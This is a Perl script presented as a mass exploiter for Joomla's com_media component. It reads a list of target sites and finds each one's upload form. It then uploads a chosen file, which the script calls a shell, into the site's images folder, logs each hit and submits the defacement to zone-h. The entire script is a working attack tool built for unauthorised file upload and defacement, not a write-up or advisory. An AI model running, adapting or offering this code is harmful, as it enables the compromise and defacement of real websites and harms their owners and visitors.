#!/usr/bin/perl
#                        ->Coder By CrashBandicot
#                        ->sh00tz<- Magnom , m0sta , hamid , samim , Yunus, Ghosty
#                        -> Coded in Fast , Design not really good :/

use LWP::UserAgent;
use HTTP::Request::Common;
if ($^O =~ /Win/) { system("cls"); } else { system("clear"); }
print "
	              
               Com_media Auto Explo!ter 
               by CrashBandicot         

         Usage : $0 list.txt file.jpg or file.txt

\n";

$file = $ARGV[1];
unless ($file) {

	print "\n\n !!! Usage : $0 list.txt file.jpg or file.txt !! \n\n";
	exit;
}
open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){
chomp($_);
$webs = $_;
if($webs !~ /http:\/\//)
{
$webs = "http://$webs";
}
$zeeb = $webs."/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";

print " [+] Scanning -> $webs";

$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$fucki = $ua->get($zeeb);
$kzz = $fucki->content;
if($kzz =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $kzz =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
	print "\n\n [+] Try Upload >> $webs"; sleep(1);

 $url = $1;
 $url =~ s/&amp;/&/gi;

 } else { print "\n\n [-] com_media not found -> $webs"; sleep(1); }

 my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$file] ]);

 $shell = $webs."/images/".$file;

 $check = $ua->get($shell);
 if($check->content =~/by/ || $check->is_success ) {

 	print "\n\n  [+] File Uploaded >> $shell\n";

open(save ,">>save.txt");
print save "$shell\n";
close save;

 $res= $ua->post("http://zone-h.org/notify/single",[
				'defacer'     => 'name of defacer here',
				'domain1'   => $shell,
				'hackmode' => '15',
				'reason'       => '1', 
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print "\n    [+] Submit zone-h $1\n"; sleep(1);
				}
				else
				{
				print "\n    [-] Submit zone-h ERROR\n"; sleep(1);
				}

 } else {  print "\n\n [-] File Upload Fail";   }


}
